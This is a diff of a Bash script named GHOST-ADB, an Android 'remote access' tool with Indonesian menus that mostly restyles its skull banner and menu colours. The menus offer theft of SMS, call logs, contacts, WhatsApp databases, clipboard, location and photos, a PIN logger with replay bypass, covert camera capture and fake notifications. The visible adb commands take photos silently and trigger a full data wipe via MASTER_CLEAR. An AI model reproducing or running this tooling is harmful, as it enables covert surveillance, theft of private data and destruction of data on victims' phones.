@@ -37,53 +37,45 @@ recon_target() {
     fi
 }
 
-#!/bin/bash
-
-RED="\033[1;31m"
-CYAN="\033[1;36m"
-GREEN="\033[1;32m"
-YELLOW="\033[1;33m"
-MAGENTA="\033[1;35m"
-WHITE="\033[1;37m"
-RESET="\033[0m"
-BOLD="\033[1m"
-
 header() {
+    tput reset
+    recon_target # Update info perangkat
+    
+    echo -e "${RED}${BOLD}"
+    # Baris 1-3: Kosongkan sampingnya agar teks tidak terlalu ke atas
+    echo -e "           uuuuuuu             "
+    echo -e "       uu\$\$\$\$\$\$\$\$\$\$\$uu         "
+    echo -e "    uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$uu      "
+    
+    # Baris 4-7: Mulai isi teks di samping (Sejajar Tengah)
+    echo -e "   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u      ${BLUE}[GHOST-ADB]${RED}"
+    echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${RED}[Android Remote Access]${RED}"
+    echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${YELLOW}[Tools BY:Sneijderlino]${RED}"
+    echo -e "  u\$\$\$\$\$\$\"   \"\$\$\$\"   \"\$\$\$\$u     ${GREEN}──────────────────────${RED}"
+    
+    # Baris 8 ke bawah: Sisa gambar tengkorak
+    echo -e "  \"\$\$\$\$\"      u\$u       \"\$\$\$\"   "   
 
-tput clear
-
-echo -e "${RED}${BOLD}           uuuuuuuu${RESET}"
-echo -e "${RED}${BOLD}       uu\$\$\$\$\$\$\$\$\$\$\$\$\$uu${RESET}"
-echo -e "${RED}${BOLD}    uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$uu${RESET}"
-echo -e "${RED}${BOLD}   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u        ${BLUE}[ GHOST-ADB ]${RESET}"
-echo -e "${RED}${BOLD}  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${RED}[Android Remote Control]${RESET}"
-echo -e "${RED}${BOLD}  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${YELLOW}[Tools By: Sneijderlino]${RESET}"
-echo -e "${RED}${BOLD}  u\$\$\$\$\$\$\"   \"\$\$\$\"   \"\$\$\$\$u${RESET}"
-echo -e "${RED}${BOLD}  \"\$\$\$\$\"      u\$u       \"\$\$\$\"${RESET}"
-echo -e "${RED}${BOLD}   \$\$\$u       u\$u       u\$\$\$${RESET}"
-echo -e "${RED}${BOLD}   \$\$\$u      u\$\$\$u      u\$\$\$${RESET}"
-echo -e "${RED}${BOLD}    \"\$\$\$\$uu\$\$\$   \$\$\$uu\$\$\$\$\"${RESET}"
-echo -e "${RED}${BOLD}     \"\$\$\$\$\$\$\$\"   \"\$\$\$\$\$\$\$\"${RESET}"
-echo -e "${RED}${BOLD}       u\$\$\$\$\$\$\$u\$\$\$\$\$\$\$u${RESET}"
-echo -e "${RED}${BOLD}        u\$\"\$\"\$\"\$\"\$\"\$\"\$u${RESET}"
-echo -e "${RED}${BOLD}         \$\$u\$u\$u\$u\$u\$\$${RESET}"
-echo -e "${RED}${BOLD}          \$\$\$\$\$\$\$\$\$\$\$${RESET}"
-echo -e "${RED}${BOLD}           \"\$\$\$\$\$\$\$\"${RESET}"
-
-echo
-echo -e "${GREEN}═══════════════════════════════════════════════════════${RESET}"
-echo -e "${CYAN} DEVICE RECON   :${RED} Android System Information Scanner"
-echo -e "${CYAN} CONNECTION CORE:${RED} Wireless ADB Pairing & Debug Bridge"
-echo -e "${CYAN} NETWORK SCAN   :${RED} Automatic ADB Device Discovery"
-echo -e "${CYAN} CONTROL PANEL  :${RED} Android Device Command Interface"
-echo -e "${CYAN} STATUS         :${YELLOW} Waiting ADB Device Connection..."
-echo -e "${GREEN}═══════════════════════════════════════════════════════${RESET}"
-
-echo -e "${RED}${BOLD}[ ○ ] MENUNGGU PERANGKAT TERHUBUNG... [ ○ ]${RESET}"
-
+    echo -e "   \$\$\$u       u\$u       u\$\$\$    "                                                  
+    echo -e "   \$\$\$u      u\$\$\$u      u\$\$\$    "                                            
+    echo -e "    \"\$\$\$\$uu\$\$\$   \$\$\$uu\$\$\$\$\"    "
+    echo -e "     \"\$\$\$\$\$\$\$\"   \"\$\$\$\$\$\$\$\"    "
+    echo -e "       u\$\$\$\$\$\$\$u\$\$\$\$\$\$\$u       "
+    echo -e "        u\$\"\$\"\$\"\$\"\$\"\$\"\$u        "
+    echo -e "         \$\$u\$u\$u\$u\$u\$\$         "
+    echo -e "          \$\$\$\$\$\$\$\$\$\$\$          "
+    echo -e "           \"\$\$\$\$\$\$\$\"           "
+    
+    # Bagian Status Perangkat (Garis Bawah)
+    echo -e "${GREEN}  ════════════════════════════════════════════════════════${RESET}"
+    if [ "$CONNECTED" = true ]; then
+        echo -e "   TARGET : ${CYAN}$MODEL (A$ANDROID_VER)${RESET} | $ROOT_S"
+        echo -e "   POWER  : ${GREEN}$BATT%${RESET} | WA: ${YELLOW}$WA_TYPE${RESET}"
+    else
+        echo -e "   ${RED}${BOLD}    [ ○ ] MENUNGGU PERANGKAT TERHUBUNG... [ ○ ]${RESET}"
+    fi
+    echo -e "${GREEN}  ════════════════════════════════════════════════════════${RESET}"
 }
-
-header
 auto_connect() {
     echo -e "${YELLOW}[*] Memulai Mode Hunting...${RESET}"
     echo -e "${GRAY}(Tekan CTRL+C untuk membatalkan)${RESET}"
@@ -119,29 +111,29 @@ menu_otomatis() {
     while true; do
         recon_target; header
         echo -e " ${CYAN}[ INTEL & EXTRACTION ]${RESET}      ${CYAN}[ MANIPULATION ]${RESET}"
-        echo -e "  1. Sedot SMS                15. Paksa Buka WA"
-        echo -e "  2. Sedot Call Log           16. Ketik Pesan WA"
-        echo -e "  3. Sedot Kontak             21. Buka Link Browser"
-        echo -e "  5. Daftar Apps              24. Putar Musik (URL)"
-        echo -e "  6. DB WhatsApp (Root/SD)    27. Kirim Pesan Toast"
-        echo -e "  12. Curi Clipboard          28. Getarkan HP (5s)"
-        echo -e "  13. Info Baterai Detail     29. Paksa Nonton YT (ID)"
-        echo -e "  14. Lokasi Maps (Lat,Long)  45. Kirim Notif Palsu"
+        echo -e "  1. ${GREEN}Sedot SMS${RESET}                15. ${GREEN}Paksa Buka WA${RESET}"
+        echo -e "  2. ${GREEN}Sedot Call Log${RESET}           16. ${GREEN}Ketik Pesan WA${RESET}"
+        echo -e "  3. ${GREEN}Sedot Kontak${RESET}             21. ${GREEN}Buka Link Browser${RESET}"
+        echo -e "  5. ${GREEN}Daftar Apps${RESET}              24. ${GREEN}Putar Musik (URL)${RESET}"
+        echo -e "  6. ${GREEN}DB WhatsApp (Root/SD)${RESET}    27. ${GREEN}Kirim Pesan Toast${RESET}"
+        echo -e "  12. ${GREEN}Curi Clipboard${RESET}          28. ${GREEN}Getarkan HP (5s)${RESET}"
+        echo -e "  13. ${GREEN}Info Baterai Detail${RESET}     29. ${GREEN}Paksa Nonton YT (ID)${RESET}"
+        echo -e "  14. ${GREEN}Lokasi Maps (Lat,Long)${RESET}  45. ${GREEN}Kirim Notif Palsu${RESET}"
         echo -e ""
         echo -e " ${CYAN}[ CAMERA & PIN LOGGER ]${RESET}     ${CYAN}[ SYSTEM TORTURE ]${RESET}"
-        echo -e "  c1. Foto Kamera Depan       35. Mirror Scrcpy"
-        echo -e "  c2. Foto Kamera Belakang    37. Injeksi Keyboard"
-        echo -e "  c3. Rekam Video Depan       40. Ganti Wallpaper"
-        echo -e "  c4. Rekam Video Belakang    41. 🔊 Mainkan Alarm (Max)"
-        echo -e "  32. Buka Kamera (Live)      42. 👻 Kirim & Putar MP3"
-        echo -e "  p1. 🔴 Rekam PIN (Logger)   43. 🔇 Stop Semua Suara"
-        echo -e "  p2. 🟢 Replay PIN (Bypass)  48. Spam Tombol Back"
+        echo -e "  c1. ${GREEN}Foto Kamera Depan${RESET}       35. ${GREEN}Mirror Scrcpy${RESET}"
+        echo -e "  c2. ${GREEN}Foto Kamera Belakang${RESET}    37. ${GREEN}Injeksi Keyboard${RESET}"
+        echo -e "  c3. ${GREEN}Rekam Video Depan${RESET}       40. ${GREEN}Ganti Wallpaper${RESET}"
+        echo -e "  c4. ${GREEN}Rekam Video Belakang${RESET}    41. 🔊 ${GREEN}Mainkan Alarm (Max)${RESET}"
+        echo -e "  32. ${GREEN}Buka Kamera (Live)${RESET}      42. 👻 ${GREEN}Kirim & Putar MP3${RESET}"
+        echo -e "  p1. 🔴 ${GREEN}Rekam PIN (Logger)${RESET}   43. 🔇 ${GREEN}Stop Semua Suara${RESET}"
+        echo -e "  p2. 🟢 ${GREEN}Replay PIN (Bypass)${RESET}  48. ${GREEN}Spam Tombol Back${RESET}"
         echo -e ""
         echo -e " ${CYAN}[ MULTIMEDIA ]${RESET}              ${CYAN}[ POWER ]${RESET}"
-        echo -e "  25. Screenshot              50. Power Off"
-        echo -e "  26. ScreenRecord            51. Reboot"
-        echo -e "  30. Sedot Galeri            53. Senter"
-        echo -e "  31. Sedot Download          54. WIPE ALL DATA"
+        echo -e "  25. ${GREEN}$Screenshot${RESET}              50. ${RED}Power Off${RESET}"
+        echo -e "  26. ${GREEN}ScreenRecord${RESET}            51. ${RED}Reboot${RESET}"
+        echo -e "  30. ${GREEN}Sedot Galeri${RESET}            53. ${RED}Senter${RESET}"
+        echo -e "  31. ${GREEN}Sedot Download${RESET}          54. ${RED}WIPE ALL DATA${RESET}"
         echo -e ""
         echo -e " ${WHITE}0. KEMBALI KE MENU UTAMA${RESET}"
         tput cnorm; read -p " ghost@kali-neraka › " OPT; tput civis
@@ -183,7 +175,7 @@ menu_otomatis() {
             53) adb shell "su -c 'echo 255 > /sys/class/leds/flashlight/brightness'" ;;
             54) echo -e "${RED}WIPE DATA? (y/n)${RESET}"; read -p "> " Y; [ "$Y" == "y" ] && adb shell am broadcast -a android.intent.action.MASTER_CLEAR ;;
             
-
+            # --- TAMBAHAN COMMAND BARU ---
             c1) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
             c2) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false; sleep 2; adb shell input keyevent 27 ;;
             c3) adb shell am start -a android.media.action.VIDEO_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
@@ -202,7 +194,7 @@ while true; do
     echo -e " 3) 💀 ${GREEN}GHOST COMMANDS${RESET}      7) 🔗 ${GREEN}CONNECT DIRECT TCP${RESET}"
     echo -e " 4) 🐚 ${GREEN}MANUAL VOID SHELL${RESET}   8) 🚀 ${BLUE}START HUNTING (AUTO-SCAN)${RESET}"
     echo -e " q) ${RED}EXIT${RESET}"
-    tput cnorm; read -p " ghost@kali-neraka › " M; tput civis
+    tput cnorm; read -p " ghost@kali › " M; tput civis
     case $M in
         1) T=$(tail -n 1 "$CACHE_FILE" 2>/dev/null); [ ! -z "$T" ] && adb connect "$T" ;;
         2) read -p "IP: " IP; read -p "P-Port: " PP; read -p "Code: " PC; read -p "D-Port: " DP
